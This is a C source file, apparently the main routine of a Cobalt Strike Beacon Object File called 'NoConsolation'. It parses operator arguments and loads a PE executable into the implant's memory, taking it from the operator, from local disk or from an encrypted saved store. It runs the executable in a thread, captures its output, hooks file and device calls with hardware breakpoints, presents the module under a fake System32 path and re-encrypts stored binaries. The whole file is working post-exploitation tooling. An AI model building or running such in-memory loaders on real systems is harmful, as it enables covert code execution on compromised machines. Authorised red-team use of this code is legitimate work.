
#include <windows.h>
#include "output.h"
#include "peb.c"
#include "loader.c"
#include "console.c"
#include "runner.c"
#include "hwbp.c"
#include "utils.c"
#include "apisetlookup.c"

int go(IN PCHAR Buffer, IN ULONG Length)
{
    datap           parser        = { 0 };
    int             pe_length     = 0;
    LPSTR           pe_name       = NULL;
    LPWSTR          pe_wname      = NULL;
    LPWSTR          pe_wpath      = NULL;
    PVOID           pe_bytes      = 0;
    LPSTR           pe_path       = 0;
    BOOL            local         = FALSE;
    UINT32          timeout       = 0;
    BOOL            headers       = FALSE;
    LPWSTR          cmdwline      = NULL;
    LPCSTR          cmdline       = NULL;
    LPSTR           method        = NULL;
    BOOL            use_unicode   = FALSE;
    BOOL            nooutput      = FALSE;
    BOOL            alloc_console = FALSE;
    BOOL            close_handles = FALSE;
    LPSTR           unload_libs   = NULL;
    BOOL            dont_save     = FALSE;
    BOOL            list_pes      = FALSE;
    LPSTR           unload_pe     = NULL;
    BOOL            recovered_pe  = FALSE;
    LPSTR           username      = NULL;
    LPSTR           loadtime      = NULL;
    BOOL            link_to_peb   = FALSE;
    BOOL            dont_unload   = FALSE;
    BOOL            load_all_deps = FALSE;
    LPSTR           load_all_deps_but = NULL;
    LPSTR           load_deps     = NULL;
    LPSTR           search_paths  = NULL;
    PLIB_LOADED     lib_loaded    = NULL;
    PLIB_LOADED     lib_tmp       = NULL;
    PLOADED_PE_INFO peinfo        = NULL;
    PLIBS_LOADED    libs_loaded   = NULL;
    PMEMORY_STRUCTS mem_structs   = NULL;
    BOOL            inthread      = FALSE;

    BeaconDataParse(&parser, Buffer, Length);
    pe_wname      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    pe_wname      = pe_wname[0] ? pe_wname : NULL;
    pe_name       = BeaconDataExtract(&parser, NULL);
    pe_name       = pe_name[0] ? pe_name : NULL;
    pe_wpath      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    pe_wpath      = pe_wpath[0] ? pe_wpath : NULL;
    pe_bytes      = BeaconDataExtract(&parser, &pe_length);
    pe_path       = BeaconDataExtract(&parser, NULL);
    pe_path       = pe_path[0] ? pe_path : NULL;
    local         = BeaconDataInt(&parser);
    timeout       = BeaconDataInt(&parser);
    headers       = BeaconDataInt(&parser);
    cmdwline      = (LPWSTR)BeaconDataExtract(&parser, NULL);
    cmdline       = BeaconDataExtract(&parser, NULL);
    method        = BeaconDataExtract(&parser, NULL);
    use_unicode   = BeaconDataInt(&parser);
    nooutput      = BeaconDataInt(&parser);
    alloc_console = BeaconDataInt(&parser);
    close_handles = BeaconDataInt(&parser);
    unload_libs   = BeaconDataExtract(&parser, NULL);
    unload_libs   = unload_libs[0] ? unload_libs : NULL;
    dont_save     = BeaconDataInt(&parser);
    list_pes      = BeaconDataInt(&parser);
    unload_pe     = BeaconDataExtract(&parser, NULL);
    unload_pe     = unload_pe[0] ? unload_pe : NULL;
    username      = BeaconDataExtract(&parser, NULL);
    username      = username[0] ? username : NULL;
    loadtime      = BeaconDataExtract(&parser, NULL);
    loadtime      = loadtime[0] ? loadtime : NULL;
    link_to_peb   = BeaconDataInt(&parser);
    dont_unload   = BeaconDataInt(&parser);
    load_all_deps = BeaconDataInt(&parser);
    load_all_deps_but = BeaconDataExtract(&parser, NULL);
    load_all_deps_but = load_all_deps_but[0] ? load_all_deps_but : NULL;
    load_deps     = BeaconDataExtract(&parser, NULL);
    load_deps     = load_deps[0] ? load_deps : NULL;
    search_paths  = BeaconDataExtract(&parser, NULL);
    search_paths  = search_paths[0] ? search_paths : NULL;
    inthread      = BeaconDataInt(&parser);

    peinfo = intAlloc(sizeof(LOADED_PE_INFO));

    StringCopyA(peinfo->pe_name,  pe_name ? pe_name : "NoConsolation.dll");
    wcscpy(peinfo->pe_wname, pe_wname ? pe_wname : L"NoConsolation.dll");
    wcscpy(peinfo->pe_wpath, pe_wpath ? pe_wpath : L"C:\\Windows\\System32\\NoConsolation.dll");
    peinfo->timeout       = timeout;
    peinfo->headers       = headers;
    peinfo->method        = method[0] ? method : NULL;
    peinfo->use_unicode   = use_unicode;
    peinfo->cmdwline      = cmdwline[0] ? cmdwline : NULL;
    peinfo->cmdline       = cmdline[0] ? cmdline : NULL;
    peinfo->nooutput      = nooutput;
    peinfo->alloc_console = alloc_console;
    peinfo->link_to_peb   = link_to_peb;
    peinfo->dont_unload   = dont_unload;
    peinfo->is_dependency = FALSE;
    peinfo->load_all_deps = load_all_deps;
    peinfo->load_all_deps_but = load_all_deps_but;
    peinfo->load_deps     = load_deps;
    peinfo->search_paths  = search_paths;
    peinfo->custom_loaded = TRUE;
    peinfo->inthread      = inthread;

    // save a reference to peinfo
    BeaconAddValue(NC_PE_INFO_KEY, peinfo);

    // init the 'DLLs loaded' linked list
    libs_loaded = BeaconGetValue(NC_LOADED_DLL_KEY);
    if (!libs_loaded)
    {
        libs_loaded = intAlloc(sizeof(LIBS_LOADED));
        libs_loaded->list.Flink = libs_loaded->list.Blink = &libs_loaded->list;
        BeaconAddValue(NC_LOADED_DLL_KEY, libs_loaded);
    }

    mem_structs = BeaconGetValue(NC_MEM_STRUCTS_KEY);
    if (!mem_structs)
    {
        mem_structs = intAlloc(sizeof(MEMORY_STRUCTS));
        BeaconAddValue(NC_MEM_STRUCTS_KEY, mem_structs);
    }

    if (list_pes)
    {
        list_saved_pes();
        goto Cleanup;
    }

    if (unload_pe)
    {
        if (remove_saved_pe(unload_pe))
        {
            PRINT("removed %s", unload_pe);
            goto Cleanup;
        }
        else
        {
            PRINT_ERR("failed to remove %s", unload_pe);
            goto Cleanup;
        }
    }

    // if no PE was provided, go to cleanup
    if (!pe_name && !pe_path && !pe_length)
        goto Cleanup;

    // the PE was provided by the operator
    if (pe_bytes && pe_length)
    {
        if (!dont_save)
            save_pe_info(pe_name, pe_bytes, pe_length, username, loadtime);
    }
    // read PE from local filesystem
    else if (local)
    {
        if (!read_local_pe(pe_path, &pe_bytes, &pe_length))
        {
            PRINT_ERR("failed to load %s", pe_path);
            goto Cleanup;
        }
        if (!dont_save)
            save_pe_info(pe_name, pe_bytes, pe_length, username, loadtime);
    }
    // recover executable from saved PEs
    else
    {
        if (!get_saved_pe(pe_name, &pe_bytes, &pe_length))
        {
            PRINT_ERR("failed to load %s from saved binaries", pe_name);
            goto Cleanup;
        }
        recovered_pe = TRUE;
    }

    if (!load_pe(pe_bytes, pe_length, peinfo))
    {
        PRINT_ERR("peload failure");
        goto Cleanup;
    }

    if (peinfo->inthread)
    {
        peinfo->hThread = NtCurrentThread();
    }
    else
    {
        if (!create_thread(&peinfo->hThread))
        {
            PRINT_ERR("failed to create thread");
            goto Cleanup;
        }
    }

    if (!redirect_std_out_err(peinfo))
    {
        PRINT_ERR("failed to redirect output");
        goto Cleanup;
    }

    if (!run_pe(peinfo))
    {
        PRINT_ERR("failed to run pe");
        goto Cleanup;
    }

Cleanup:
    if (recovered_pe)
        reencrypt_pe(pe_name);

    if (local && pe_bytes)
    {
        memset(pe_bytes, 0, pe_length);
        intFree(pe_bytes);
    }

    if (peinfo && peinfo->inthread && peinfo->hHwBp1)
        unset_hwbp(peinfo->hThread, NT_DEVICE_IO_CONTROL_FILE_INDEX);

    if (peinfo && peinfo->inthread && peinfo->hHwBp2)
        unset_hwbp(peinfo->hThread, CREATE_FILE_INDEX);

    if (peinfo && peinfo->hHwBp1)
        remove_hwbp_handler(peinfo->hHwBp1);

    if (peinfo && peinfo->hHwBp2)
        remove_hwbp_handler(peinfo->hHwBp2);

    if (close_handles)
    {
        DPRINT("Freeing handles");
        if (peinfo && peinfo->Handles && peinfo->Handles->fo_msvc)
        {
            void ( WINAPI *msvcrt_close ) ( int ) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "_close", 0);
            if (msvcrt_close)
                msvcrt_close(peinfo->Handles->fo_msvc);
        }

        if (peinfo && peinfo->Handles && peinfo->Handles->fo_ucrtbase)
        {
            void ( WINAPI *ucrtbase_close ) ( int ) = xGetProcAddress(xGetLibAddress("ucrtbase", TRUE, NULL), "_close", 0);
            if (ucrtbase_close)
                ucrtbase_close(peinfo->Handles->fo_ucrtbase);
        }

        if (peinfo && peinfo->Handles && peinfo->Handles->hRead)
            NtClose(peinfo->Handles->hRead);

        if (peinfo && peinfo->Handles && peinfo->Handles->hWrite)
            NtClose(peinfo->Handles->hWrite);

        if (peinfo && peinfo->Handles)
        {
            memset(peinfo->Handles, 0, sizeof(HANDLE_INFO));
            intFree(peinfo->Handles);
        }

        BeaconRemoveValue(NC_HANDLE_INFO_KEY);
    }

    if (peinfo && peinfo->modified_msvc_stdout)
        memcpy(peinfo->msvc_stdout, peinfo->original_msvc_stdout, sizeof(FILE));

    if (peinfo && peinfo->modified_msvc_stderr)
        memcpy(peinfo->msvc_stderr, peinfo->original_msvc_stderr, sizeof(FILE));

    if (peinfo && peinfo->modified_ucrtbase_stdout)
        memcpy(peinfo->ucrtbase_stdout, peinfo->original_ucrtbase_stdout, sizeof(UCRTBASE_FILE));

    if (peinfo && peinfo->modified_ucrtbase_stderr)
        memcpy(peinfo->ucrtbase_stderr, peinfo->original_ucrtbase_stderr, sizeof(UCRTBASE_FILE));

    if (peinfo && peinfo->original_msvc_stdout)
    {
        memset(peinfo->original_msvc_stdout, 0, sizeof(FILE));
        intFree(peinfo->original_msvc_stdout);
    }

    if (peinfo && peinfo->original_msvc_stderr)
    {
        memset(peinfo->original_msvc_stderr, 0, sizeof(FILE));
        intFree(peinfo->original_msvc_stderr);
    }

    if (peinfo && peinfo->original_ucrtbase_stdout)
    {
        memset(peinfo->original_ucrtbase_stdout, 0, sizeof(UCRTBASE_FILE));
        intFree(peinfo->original_ucrtbase_stdout);
    }

    if (peinfo && peinfo->original_ucrtbase_stderr)
    {
        memset(peinfo->original_ucrtbase_stderr, 0, sizeof(UCRTBASE_FILE));
        intFree(peinfo->original_ucrtbase_stderr);
    }

    if (peinfo && peinfo->modified_console_handle)
        set_console_handle(peinfo->original_console_handle);

    if (peinfo && peinfo->modified_console_reference)
        *(PHANDLE)peinfo->console_reference_addr = peinfo->original_console_reference;

    if (peinfo && peinfo->hThread && !peinfo->inthread)
    {
        TerminateThread(peinfo->hThread, 0);
        NtClose(peinfo->hThread);
    }

    // free all dependencies
    lib_loaded = (PLIB_LOADED)libs_loaded->list.Flink;
    while (&lib_loaded->list != &libs_loaded->list)
    {
        lib_tmp = (PLIB_LOADED)lib_loaded->list.Flink;

        if (!lib_loaded->peinfo->dont_unload && lib_loaded->peinfo->custom_loaded)
        {
            unload_dependency(lib_loaded->peinfo);
            unlink_from_list(&lib_loaded->list);

            memset(lib_loaded->peinfo, 0, sizeof(LOADED_PE_INFO));
            intFree(lib_loaded->peinfo);
            memset(lib_loaded, 0, sizeof(LIB_LOADED));
            intFree(lib_loaded);
        }

        lib_loaded = lib_tmp;
    }

    if (unload_libs)
    {
        lib_loaded = (PLIB_LOADED)libs_loaded->list.Flink;
        while (&lib_loaded->list != &libs_loaded->list)
        {
            lib_tmp = (PLIB_LOADED)lib_loaded->list.Flink;

            DPRINT("unload_libs: %s, lib_loaded->name: %s", unload_libs, lib_loaded->name);
            if (string_is_included(unload_libs, lib_loaded->name))
            {
                PRINT("unloaded %s", lib_loaded->name);
                if (lib_loaded->peinfo->custom_loaded)
                    unload_dependency(lib_loaded->peinfo);
                else
                    FreeLibrary(lib_loaded->address);

                unlink_from_list(&lib_loaded->list);
                memset(lib_loaded->peinfo, 0, sizeof(LOADED_PE_INFO));
                intFree(lib_loaded->peinfo);
                memset(lib_loaded, 0, sizeof(LIB_LOADED));
                intFree(lib_loaded);
            }

            lib_loaded = lib_tmp;
        }
    }

    if (peinfo && !peinfo->dont_unload)
    {
        unload_dependency(peinfo);
        memset(peinfo, 0, sizeof(LOADED_PE_INFO));
        intFree(peinfo);
    }

    BeaconRemoveValue(NC_PE_INFO_KEY);

    return 0;
}
